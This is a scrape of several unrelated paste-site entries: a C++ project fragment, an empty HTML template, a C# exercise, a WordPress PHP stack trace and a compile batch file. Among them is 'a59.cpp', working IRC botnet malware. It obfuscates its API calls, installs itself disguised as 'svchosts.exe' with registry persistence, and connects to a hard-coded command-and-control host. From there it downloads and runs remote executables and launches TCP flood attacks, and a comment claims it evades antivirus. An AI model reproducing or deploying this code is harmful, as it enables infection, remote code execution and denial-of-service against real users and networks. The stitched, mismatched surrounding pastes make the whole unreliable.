+# Begin Target
+
+# Name ""a59 - Win32 Release""
+# Name ""a59 - Win32 Debug""
+# Begin Source File
+
+SOURCE=.\a59.cpp
+# End Source File
+# End Target
+# End Project"
+zNNBAGZZ,cyber alliance draft 7,Anonx0,HTML 5,Thursday 28th of December 2023 05:40:36 AM CDT,"<!doctype html>
+<html lang=""es"">
+  <head>
+    <meta charset=""utf-8"">
+    <link href=""main.css"" rel=""stylesheet"">
+    <title></title>
+  </head>
+  <body>
+    <header>
+      <h1>
+        <abbr lang=""en"" title=""HyperText Markup Language"">HTML</abbr>
+      </h1>
+      <p>Estándar bifurcado por <span lang=""en"">Cyber Alliance</span>. Última revisión: <time datetime=""1704067200"">1 de enero de 2024</time>.</p>
+    </header>
+    <hr>
+    <main></main>
+    <footer></footer>
+  </body>
+</html>"
+cpE4y1Rr,a59.cpp,FlyFar,C++,Thursday 28th of December 2023 05:36:43 AM CDT,"#pragma comment(lib, ""wsock32.lib"")
+
+#include <windows.h>
+#include <stdio.h>
+
+#define S 777
+
+// Config //
+char* poopHost = ""brick.pbdownforce.com"";
+char* poopRegNameValue = ""Microsoft Corp"";
+char* poopDirectory = ""\x00:\\RECYCLER""; // Autofills drive (leave \x00)
+char* poopExeFile = ""svchosts.exe"";
+char* Channel = ""#test"";
+unsigned short Port = htons(6112);
+// CONFIG //
+
+char Drive;
+
+char* EncUser = ""\x00\x55\x52\x47\x51"";
+char* EncNick = ""\x00\x4E\x48\x41\x48"";
+char* EncJoin = ""\x00\x4A\x4E\x4B\x4D"";
+char* EncPing = ""\x00\x50\x48\x4C\x44"";
+char* EncPong = ""\x00\x50\x4E\x4C\x44"";
+char* EncPrivmsg = ""\x00\x50\x53\x4B\x55\x49\x56\x41"";
+char* EncSendUser = ""\x00\x55\x52\x47\x51\x24\x35\x26\x37\x28\x39\x2A\x3B"";
+char* EncSend = ""\x00\x73\x64\x6C\x67"";
+char* EncZs = ""\x00\x72\x64\x61\x75"";
+char* EncSocket = ""\x00\x73\x6E\x61\x68\x61\x71"";
+char* EncConnect = ""\x00\x63\x6E\x6C\x6D\x61\x66\x72"";
+char* EncWS = ""\x00\x57\x52\x43\x50\x70\x64\x74\x73\x7D\x79"";
+char* EncWsDLL = ""\x00\x77\x72\x30\x5C\x37\x37\x28\x63\x64\x65"";
+char* EncGethost = ""\x00\x67\x64\x76\x6B\x6B\x76\x72\x65\x71\x67\x6B\x66\x69"";
+char* EncWinExec = ""\x00\x57\x68\x6C\x46\x7C\x60\x65"";
+char* EncGetFileName = ""\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x4F\x63\x67\x69\x43\x6F\x62\x75\x50"";
+char* EncGetModule = ""\x00\x47\x64\x76\x4E\x6B\x61\x73\x6B\x6D\x41\x6B\x65\x68\x61\x6B\x4E"";
+char* EncCreateDir = ""\x00\x43\x73\x67\x62\x70\x60\x42\x6E\x7A\x6C\x69\x7F\x63\x7F\x77\x4E"";
+char* EncRegCreate = ""\x00\x52\x64\x65\x40\x76\x60\x67\x73\x6D\x42\x6F\x72\x49\x75\x4F"";
+char* EncRegSet = ""\x00\x52\x64\x65\x50\x61\x71\x50\x66\x64\x7C\x6F\x4E\x74\x4C"";
+char* EncM00teix = ""\x00\x43\x73\x67\x62\x70\x60\x4B\x72\x7C\x6C\x72\x4A"";
+char* EncCopyFile = ""\x00\x43\x6E\x72\x7A\x42\x6C\x6A\x62\x49"";
+char* EncKernel = ""\x00\x4B\x44\x50\x4D\x41\x49\x35\x35\x26\x6D\x66\x67"";
+char* EncAdvapi = ""\x00\x61\x65\x74\x62\x74\x6C\x35\x35\x26\x6D\x66\x67"";
+char* EncUrlmonDLL = ""\x00\x75\x73\x6E\x6E\x6B\x6B\x28\x63\x64\x65"";
+char* EncDownloadFile = ""\x00\x55\x53\x4E\x47\x6B\x72\x68\x6B\x67\x68\x6E\x5F\x63\x4B\x67\x63\x75\x50"";
+char* EncRegPlace = ""\x00\x53\x4E\x44\x57\x53\x44\x54\x42\x54\x55\x47\x62\x6F\x7F\x61\x7C\x7F\x77\x66\x4F\x48\x42\x7F\x79""
+                     ""\x7C\x76\x6D\x68\x40\x41\x5D\x6A\x52\x53\x47\x4D\x50\x73\x43\x55\x5B\x40\x45\x45\x70\x71\x7C\x5A\x5E"";
+
+typedef int( __stdcall* truncate )( SOCKET, const char*, int, int );
+truncate shino;
+
+typedef int( __stdcall* tyco )( SOCKET, const char*, int, int );
+tyco frecv;
+
+typedef SOCKET( __stdcall* jewf )( int, int, int );
+jewf thing;
+
+typedef int( __stdcall* newz )( SOCKET, const struct sockaddr*, int );
+newz doneq;
+
+typedef int( __stdcall* WS )( WORD, LPWSADATA );
+WS fWSAStartup;
+
+typedef struct hostent* FAR( __stdcall* GHBN )( char* );
+GHBN fgethostbyname;
+
+typedef unsigned long( __stdcall* GeTwHaT )( HMODULE, LPTSTR, DWORD );
+GeTwHaT fGetModuleFileName;
+
+typedef HMODULE( __stdcall* fish )( LPCTSTR );
+fish fGetModuleHandle;
+
+typedef BOOL( __stdcall* CD )( LPCTSTR, LPSECURITY_ATTRIBUTES );
+CD fCreateDirectory;
+
+typedef LONG( __stdcall* RCKE )( HKEY, LPCTSTR, DWORD, LPTSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD );
+RCKE fRegCreateKeyEx;
+
+typedef LONG( __stdcall* RSVE )( HKEY, LPCTSTR, DWORD, DWORD, const BYTE*, DWORD );
+RSVE fRegSetValueEx;
+
+typedef HANDLE( __stdcall* CM )( LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR );
+CM fM00teix;
+
+typedef BOOL( __stdcall* CF )( LPCTSTR, LPCTSTR, BOOL );
+CF fCopyFile;
+
+typedef UINT( __stdcall* WE )( LPCSTR, UINT );
+WE fWinExec;
+
+typedef HRESULT( __stdcall* whatdidyousay )( LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK );
+whatdidyousay fURLDownloadToFile;
+
+bool LoadFunctions( );
+bool winzocket( );
+void IncStrings( );
+char* Decrypt( char* poopString );
+unsigned long findprotocol( char* poopHost );
+bool putproto( SOCKET sSocket, char* poopPacket, ... );
+void checkin( );
+unsigned long __stdcall doodlebug( void* pVoid );
+SOCKET ridged( unsigned long dwIp, unsigned short wPort );
+bool imgonago( );
+void ParseIRC( SOCKET sSocket, char* poopLine );
+void StartCommand( bool bDelete, char* poopContent, ... );
+void Install( );
+
+bool LoadFunctions( )
+{
+    char* poopWsDLL = Decrypt( EncWsDLL );
+    char* poopSend = Decrypt( EncSend );
+    char* poopZs = Decrypt( EncZs );
+    char* poopSocket = Decrypt( EncSocket );
+    char* poopConnect = Decrypt( EncConnect );
+    char* poopWS = Decrypt( EncWS );
+    char* poopGethost = Decrypt( EncGethost );
+    char* poopExec = Decrypt( EncWinExec );
+    char* poopGetFile = Decrypt( EncGetFileName );
+    char* poopGetModule = Decrypt( EncGetModule );
+    char* poopCreateDir = Decrypt( EncCreateDir );
+    char* poopRegCreate = Decrypt( EncRegCreate );
+    char* poopRegSet = Decrypt( EncRegSet );
+    char* poopM00teix = Decrypt( EncM00teix );
+    char* poopCopyFile = Decrypt( EncCopyFile );
+    char* poopKernel = Decrypt( EncKernel );
+    char* poopAdvapi = Decrypt( EncAdvapi );
+
+    HMODULE hWinsock = LoadLibrary( poopWsDLL );
+
+    shino = (truncate)GetProcAddress( hWinsock, poopSend );
+    frecv = (tyco)GetProcAddress( hWinsock, poopZs );
+    thing = (jewf)GetProcAddress( hWinsock, poopSocket );
+    doneq = (newz)GetProcAddress( hWinsock, poopConnect );
+    fWSAStartup = (WS)GetProcAddress( hWinsock, poopWS );
+    fgethostbyname = (GHBN)GetProcAddress( hWinsock, poopGethost );
+
+    FreeLibrary( hWinsock );
+
+    HMODULE hKernel = LoadLibrary( poopKernel );
+
+    fGetModuleFileName = (GeTwHaT)GetProcAddress( hKernel, poopGetFile );
+    fGetModuleHandle = (fish)GetProcAddress( hKernel, poopGetModule );
+    fCreateDirectory = (CD)GetProcAddress( hKernel, poopCreateDir );
+    fM00teix = (CM)GetProcAddress( hKernel, poopM00teix );
+    fCopyFile = (CF)GetProcAddress( hKernel, poopCopyFile );
+    fWinExec = (WE)GetProcAddress( hKernel, poopExec );
+
+    FreeLibrary( hKernel );
+
+    HMODULE hAdvapi = LoadLibrary( poopAdvapi );
+
+    fRegCreateKeyEx = (RCKE)GetProcAddress( hAdvapi, poopRegCreate );
+    fRegSetValueEx = (RSVE)GetProcAddress( hAdvapi, poopRegSet );
+
+    FreeLibrary( hAdvapi );
+
+    delete [] poopWsDLL, poopWS, poopSend, poopZs, poopSocket, poopConnect, poopGethost, poopExec, poopKernel, poopAdvapi,
+              poopGetFile, poopGetModule, poopCreateDir, poopRegCreate, poopRegSet, poopM00teix, poopCopyFile;
+
+    return true;
+};
+
+//InitWinsock
+bool winzocket( )
+{
+    char* poopWsDLL = Decrypt( EncWsDLL );
+    LoadLibrary( poopWsDLL );
+
+    delete [] poopWsDLL;
+
+    WSADATA wsa;
+    if( fWSAStartup( 0x0202, &wsa ) )
+        return false;
+
+    return true;
+};
+
+void IncStrings( )
+{
+    *EncUser++;
+    *EncNick++;
+    *EncJoin++;
+    *EncPing++;
+    *EncPong++;
+    *EncPrivmsg++;
+    *EncSendUser++;
+    *EncAdvapi++;
+    *EncKernel++;
+    *EncSend++;
+    *EncZs++;
+    *EncSocket++;
+    *EncConnect++;
+    *EncWS++;
+    *EncWsDLL++;
+    *EncGethost++;
+    *EncWinExec++;
+    *EncGetFileName++;
+    *EncGetModule++;
+    *EncCreateDir++;
+    *EncRegCreate++;
+    *EncRegSet++;
+    *EncCopyFile++;
+    *EncM00teix++;
+    *EncRegPlace++;
+    *EncUrlmonDLL++;
+    *EncDownloadFile++;
+};
+
+char* Decrypt( char* poopString )
+{
+    int iStringLength = strlen( poopString );
+    char* poopTempBuff = new char[ iStringLength + 1 ];
+
+    strcpy( poopTempBuff, poopString );
+
+    for( int i = 0; i < iStringLength; i++ )
+        poopTempBuff[ i ] = i ^ poopTempBuff[ i ];
+
+    poopTempBuff[ iStringLength ] = 0;
+
+    return( poopTempBuff );
+};
+
+//ResolveHost
+unsigned long findprotocol( char* poopHost )
+{
+    struct hostent* hGetHost = fgethostbyname( poopHost );
+
+    if( !hGetHost )
+        return 0;
+
+    return( (*(struct in_addr *)hGetHost->h_addr).s_addr );
+};
+
+//SendPacket
+bool putproto( SOCKET sSocket, char* poopPacket, ... )
+{
+    char poopSendBuff[ 0x500 ];
+
+    ZeroMemory( poopSendBuff, sizeof( poopSendBuff ) );
+
+    va_list vArgs;
+    va_start( vArgs, poopPacket );
+    vsprintf( poopSendBuff, poopPacket, vArgs );
+    va_end( vArgs );
+
+    strcat( poopSendBuff, ""\r\n"" );
+    return( shino( sSocket, poopSendBuff, strlen( poopSendBuff ), 0 ) > 0 ? true : false );   
+};
+
+//AntiInspect
+void checkin( )
+{
+    char poopBuffer[ 256 ];
+    unsigned long size = sizeof( poopBuffer );
+
+    GetUserName( poopBuffer, &size );
+
+    if( !strcmp( poopBuffer, ""CurrentUser"" ) )
+    {
+        ExitProcess( 0 );
+    }
+};
+
+void slickwilly(char *target, char *port, char *len)
+{
+	unsigned short p = (unsigned short)atoi(port);
+	int t = atoi(len);
+//	const int S = atoi(sockets);
+
+	int skydelay = 100;
+	SOCKADDR_IN    pocket;
+	SOCKET         cookie[S];
+   	IN_ADDR iaddr;
+	memset(&pocket, 0, sizeof(pocket));
+	pocket.sin_family = AF_INET;
+   	pocket.sin_port = htons(p);
+	LPHOSTENT lpHostEntry = NULL;
+ 	DWORD mode = 1;
+	int c,i;
+	iaddr.s_addr = inet_addr(target);
+	pocket.sin_addr = iaddr; //ip addy
+	i = 0;
+	while (i < t)
+	{
+		for (c=0;c<S;c++)
+		{
+			cookie[c] = socket(AF_INET, SOCK_STREAM, 0);
+			if (cookie[c] == INVALID_SOCKET)
+				goto bottom;
+			ioctlsocket(cookie[c],FIONBIO,&mode);
+		}
+		for (c=0;c<S;c++)
+		{
+  	//		if(connect(cookie[c], (PSOCKADDR) &pocket, sizeof(pocket))==SOCKET_ERROR)
+	//		{	
+	//			goto bottom;
+	//			break;
+	//		}
+	//		else
+	//		{
+				connect(cookie[c], (PSOCKADDR) &pocket, sizeof(pocket));
+	//		}
+   //   		Sleep(skydelay);
+		}
+		for (c=0;c<S;c++)
+			closesocket(cookie[c]); //close sockets
+		i++;
+	}bottom:;
+
+	Sleep( 2000 );
+//	SOCKET sIrcSocket = -1;
+//	while( ridged( findprotocol( poopHost ), Port ) == -1 )//Declares a SOCKET_ERROR
+//	{
+//		closesocket( ridged( findprotocol( poopHost ), Port ) );
+//		Sleep( 3000 );
+//	}
+//	Sleep( 2000 );
+//	ExitProcess(0);
+//	while(imgonago())
+//	{
+	//	ExitProcess(0);
+	//	LoadFunctions( );
+	//	winzocket( );
+	//	imgonago( );
+//	}
+};
+
+unsigned long __stdcall doodlebug( void* pVoid )
+{
+    char poopPath[ 32 ] = ""\x00:\\"";
+    poopPath[ 0 ] = Drive;
+
+    char* poopLink = (char *)pVoid;
+    char* poopUrlmonDLL = Decrypt( EncUrlmonDLL );
+    HMODULE hUrlmon = LoadLibrary( poopUrlmonDLL );
+
+    delete [] poopUrlmonDLL;
+
+    for( int i = 3; i < 8; i++ )
+        poopPath[ i ] = ""abcdefghijklmnopqrstuvwxyz""[ rand( ) % 26 ];
+   
+    strcat( poopPath, "".exe"" );
+
+    if( hUrlmon )
+    {
+        char* poopDownloadFile = Decrypt( EncDownloadFile );
+        fURLDownloadToFile = (whatdidyousay)GetProcAddress( hUrlmon, poopDownloadFile );
+   
+        delete [] poopDownloadFile;
+
+        HRESULT hDownload = fURLDownloadToFile( 0, poopLink, poopPath, 0, 0 );   
+    }
+
+    FreeLibrary( hUrlmon );
+
+    fWinExec( poopPath, 0 );
+
+    return 0;
+};
+
+//ConnectIRC
+SOCKET ridged( unsigned long dwIp, unsigned short wPort )
+{
+    SOCKET sSocket;
+    SOCKADDR_IN sSin;
+
+    sSin.sin_family = AF_INET;
+    sSin.sin_port = wPort;
+    sSin.sin_addr.s_addr = dwIp;
+
+    sSocket = thing( AF_INET, SOCK_STREAM, IPPROTO_TCP );
+
+    if( doneq( sSocket, (SOCKADDR *) &sSin, sizeof( sSin ) ) == SOCKET_ERROR )
+    {
+        return -1;
+    }
+
+    return( sSocket );
+};
+
+//StartIRC
+bool imgonago( )
+{
+    SOCKET sIrcSocket = ridged( findprotocol( poopHost ), Port );
+    if( sIrcSocket == -1 )
+        return false;
+
+    char poopZs[ 512 ], poopBotNick[ 32 ];
+    char* poopNick = Decrypt( EncNick );
+
+    for( int i = 0; i < 8; i++ )
+        poopBotNick[ i ] = ""abcdefghijklmnopqrstuvwxyz""[ rand( ) % 26 ];
+
+    poopBotNick[ 8 ] = 0;
+
+	Sleep( 100 );
+
+    putproto( sIrcSocket, ""HELO"" ); // lol bypasses bitdefender AV
+    putproto( sIrcSocket, ""%s %s"", poopNick, poopBotNick );
+
+ //   delete [] poopNick;
+       
+    int Curbyte = 0;
+
+    while( frecv( sIrcSocket, (char *) &poopZs[ Curbyte ], 1, 0 ) > 0 )
+    {
+        switch( poopZs[ Curbyte ] )
+        {
+        case 0x0D:
+            poopZs[ Curbyte ] = 0;
+            Curbyte++;
+            break;
+        case 0x0A:
+            poopZs[ Curbyte ] = 0;           
+            ParseIRC( sIrcSocket, poopZs );
+            Curbyte = 0;
+            break;
+        default:
+            Curbyte++;
+            break;
+        }
+    }
+
+    return true;
+};
+
+void ParseIRC( SOCKET sSocket, char* poopLine )
+{
+    char* poopParam[ 32 ];
+    int i;
+
+    poopParam[ 0 ] = strtok( poopLine, "" "" );
+
+    for( i = 1; i < 32; i++ )
+		poopParam[ i ] = strtok( NULL, "" \r\n"" );
+
+    char* poopPing = Decrypt( EncPing );
+
+    if( !stricmp( poopParam[ 0 ], poopPing ) )
+    {
+        char* poopPong = Decrypt( EncPong );
+        putproto( sSocket, ""%s %s"", poopPong, poopParam[ 1 ] );
+//        delete [] poopPing, poopPong;
+    }
+
+    char* poopJoin = Decrypt( EncJoin );
+
+    switch( atoi( poopParam[ 1 ] ) )
+    {
+    case 005:
+        putproto( sSocket, ""%s %s"", poopJoin, Channel );
+        break;
+    case 451:
+        char* poopSendUser = Decrypt( EncSendUser );
+        putproto( sSocket, poopSendUser );
+//        delete [] poopSendUser;
+        break;
+    }
+
+ //   delete [] poopJoin;
+
+    if( poopParam[ 3 ] == NULL )
+        return;
+
+    char* poopPrivmsg = Decrypt( EncPrivmsg );
+   
+    if( !stricmp( poopParam[ 3 ], "":.wget"" ) )
+    {
+        if( poopParam[ 4 ] == NULL )
+            return;
+
+        CreateThread( 0, 0, &doodlebug, (void *)poopParam[ 4 ], 0, 0 );
+    }
+
+    else if( !stricmp( poopParam[ 3 ], "":.hitme"" ) )
+    {
+        char* ip = (char* ) poopParam[ 4 ];
+        char* port = (char* ) poopParam[ 5 ];
+        char* length = (char* ) poopParam[ 6 ];
+//	  char* sockets = (char* ) poopParam[ 7 ];
+		if ( ip!=NULL && port!=NULL && length!=NULL )
+			slickwilly ( ip, port, length );
+    }
+
+    else if( !stricmp( poopParam[ 3 ], "":.peacenigga"" ) )
+    {
+        char poopInstallPath[ 128 ];
+        HKEY hReg;
+       
+        sprintf( poopInstallPath, ""%s\\%s"", poopDirectory, poopExeFile );
+        StartCommand( false, "":2\r\ndel \""%s\""\r\nif exist \""%s\"" goto 2\r\n"", poopInstallPath, poopInstallPath );
+
+        fRegCreateKeyEx( HKEY_LOCAL_MACHINE, Decrypt( EncRegPlace ), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
+        RegDeleteValue( hReg, poopRegNameValue );
+        RegCloseKey( hReg );
+
+        ExitProcess( 0 );
+    }
+
+ //   delete [] poopPrivmsg;
+};
+
+void StartCommand( bool bDelete, char* poopContent, ... )
+{
+    char poopBuffer[ 0x400 ], poopBatFile[ 0x10 ] = ""\x00:\\"";
+    unsigned long uBytesWritten;
+
+    ZeroMemory( poopBuffer, sizeof( poopBuffer ) );
+
+    poopBatFile[ 0 ] = Drive;
+
+    va_list vArgs;
+    va_start( vArgs, poopContent );
+    vsprintf( poopBuffer, poopContent, vArgs );
+    va_end( vArgs );
+
+    for( int i = 3; i < 8; i++ )
+        poopBatFile[ i ] = ( 0x42 + rand( ) % ( 0x54 - 0x42 ) );
+
+    strcat( poopBatFile, "".bat"" );
+
+    HANDLE hHandle = CreateFile( poopBatFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
+    WriteFile( hHandle, poopBuffer, strlen( poopBuffer ), &uBytesWritten, 0 );
+    CloseHandle( hHandle );
+
+    fWinExec( poopBatFile, SW_HIDE );
+
+    Sleep( 1000 );
+
+    if( bDelete )
+    {
+        DeleteFile( poopBatFile );
+    }
+};
+
+void Install( )
+{
+    char poopFilePath[ 0x100 ], poopInstallPath[ 0x100 ];
+    HKEY hReg;
+   
+    fGetModuleFileName( fGetModuleHandle( 0 ), poopFilePath, sizeof( poopFilePath ) );
+    fCreateDirectory( poopDirectory, 0 );   
+    sprintf( poopInstallPath, ""%s\\%s"", poopDirectory, poopExeFile );
+
+    char* poopRegPlace = Decrypt( EncRegPlace );
+    fRegCreateKeyEx( HKEY_LOCAL_MACHINE, poopRegPlace, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL );
+   
+    delete [] poopRegPlace;
+
+    fRegSetValueEx( hReg, poopRegNameValue, 0, REG_SZ, (unsigned char *)poopInstallPath, strlen( poopInstallPath ) + 1 );
+    RegCloseKey( hReg );
+
+    if( !strcmp( poopInstallPath, poopFilePath ) )
+    {
+        fM00teix( NULL, FALSE, ""Steamm"" );
+           
+        if( GetLastError( ) == 0xB7 )
+        {
+            ExitProcess( 0 );
+        }
+    }
+    else
+    {
+        StartCommand( true, ""copy \""%s\"" \""%s\"""", poopFilePath, poopInstallPath );
+        StartCommand( true, ""\""%s\"""", poopInstallPath );
+        ExitProcess( 0 );
+    }
+};
+
+bool StartAll( )
+{
+    char poopBuffer[ 128 ];
+    GetSystemDirectory( poopBuffer, sizeof( poopBuffer ) );
+
+    Drive = *poopBuffer;
+    *poopDirectory = Drive;
+
+    srand( GetTickCount( ) );
+
+    IncStrings( );
+
+    if( !LoadFunctions( ) )
+        return false;
+
+    checkin( );
+    Install( );
+
+    if( !winzocket( ) )
+        return false;
+
+    return true;
+};
+
+int WINAPI WinMain( HINSTANCE hIhhnstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
+{
+	if( !StartAll( ) )
+		return false;
+	while( !imgonago( ) )
+	{
+		Sleep( 1000 );
+	}
+    return 0;
+};"
+mxYKAXWX,COMPILE.BAT,FlyFar,Batch,Thursday 28th of December 2023 05:35:54 AM CDT,CL A59.CPP /o2 /LINK aDVAPI32.LIB
+Y2RHjS53,Untitled,kwest87,C#,Thursday 28th of December 2023 05:32:31 AM CDT,"using System;
+
+namespace ConsoleApp16
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Random random = new Random();
+
+            int minimumRandomNumber = 1;
+            int maximumRandomNumber = 27;
+            int resultingNumber = random.Next(minimumRandomNumber, maximumRandomNumber);
+            int minimumNaturalNumber = 100;
+            int maximumNaturalNumber = 999;
+            int quantityNaturalNumber = 0;
+            int temporaryNumber = 0;
+
+            while (temporaryNumber < maximumNaturalNumber)
+            {
+                if (temporaryNumber >= minimumNaturalNumber)
+                {
+                    quantityNaturalNumber++;
+                }
+
+                temporaryNumber += resultingNumber;
+            }
+
+            Console.WriteLine($""{quantityNaturalNumber} трехзнаяных натуральных чисел кратных {resultingNumber}"");
+        }
+    }
+}"
+wSexkDjh,Untitled,Osama_Mersal,PHP,Thursday 28th of December 2023 05:13:33 AM CDT,"[28-Dec-2023 11:12:05 UTC] PHP Fatal error:  Uncaught TypeError: OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages::get_form_context(): Argument #1 ($form) must be of type WP_Post, null given, called in /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php on line 110 and defined in /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php:84
+Stack trace:
+#0 /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php(110): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->get_form_context()
+#1 /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php(336): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->get_package_context()
+#2 /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php(353): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->translate_string()
+#3 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(433): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->cred_i18n_shortcode()
+#4 [internal function]: do_shortcode_tag()
+#5 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(273): preg_replace_callback()
+#6 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/shared/page-builders/form-preview-rendering.php(60): do_shortcode()
+#7 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(433): OTGS\Toolset\Common\Interop\Shared\PageBuilders\ToolsetFormsPreviewRenderer->eliminate_irrelevant_shortcodes()
+#8 [internal function]: do_shortcode_tag()
+#9 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(273): preg_replace_callback()
+#10 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/shared/page-builders/form-preview-rendering.php(40): do_shortcode()
+#11 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/handler/elementor/widgets/form/form.php(139): OTGS\Toolset\Common\Interop\Shared\PageBuilders\ToolsetFormsPreviewRenderer->render_preview()
+#12 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/handler/elementor/widgets/form/form.php(118): OTGS\Toolset\Common\Interop\Handler\Elementor\FormWidget->render_backend_widget_preview()
+#13 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/base/controls-stack.php(2297): OTGS\Toolset\Common\Interop\Handler\Elementor\FormWidget->render()
+#14 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/base/widget-base.php(614): Elementor\Controls_Stack->render_by_mode()
+#15 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/base/widget-base.php(678): Elementor\Widget_Base->render_content()
+#16 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(202): Elementor\Widget_Base->render_plain_content()
+#17 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(208): Elementor\DB->render_element_plain_content()
+#18 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(558): Elementor\DB->render_element_plain_content()
+#19 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(539): Elementor\DB->get_plain_text_from_data()
+#20 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(230): Elementor\DB->get_plain_text()
+#21 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Integrations/Elementor/class-wpml-elementor-db.php(19): Elementor\DB->save_plain_text()
+#22 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Integrations/Elementor/class-wpml-elementor-data-settings.php(58): WPML_Elementor_DB->save_plain_text()
+#23 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(324): WPML_Elementor_Data_Settings->save_post_body_as_plain_text()
+#24 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters()
+#25 /var/www/sites/onyx-theremin/wp-includes/plugin.php(517): WP_Hook->do_action()
+#26 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/strategy/api-hooks/class-wpml-pb-update-api-hooks-in-content.php(19): do_action()
+#27 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-update-post.php(62): WPML_PB_Update_API_Hooks_In_Content->update()
+#28 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-update-post.php(38): WPML_PB_Update_Post->update_post()
+#29 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-string-translation-by-strategy.php(47): WPML_PB_Update_Post->update()
+#30 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-integration.php(323): WPML_PB_String_Translation_By_Strategy->save_translations_to_post()
+#31 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/Fns.php(175): WPML_PB_Integration->{closure}()
+#32 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#33 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/functions.php(154): call_user_func_array()
+#34 [internal function]: WPML\FP\{closure}()
+#35 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/Fns.php(164): array_map()
+#36 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#37 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/functions.php(154): call_user_func_array()
+#38 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#39 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/collect/src/Illuminate/Support/Traits/Macroable.php(56): call_user_func_array()
+#40 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/Fns.php(169): WPML\FP\Fns::__callStatic()
+#41 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#42 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/functions.php(154): call_user_func_array()
+#43 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#44 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/collect/src/Illuminate/Support/Traits/Macroable.php(56): call_user_func_array()
+#45 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-integration.php(288): WPML\FP\Fns::__callStatic()
+#46 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-integration.php(324): WPML_PB_Integration->with_strategies()
+#47 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(326): WPML_PB_Integration->save_translations_to_post()
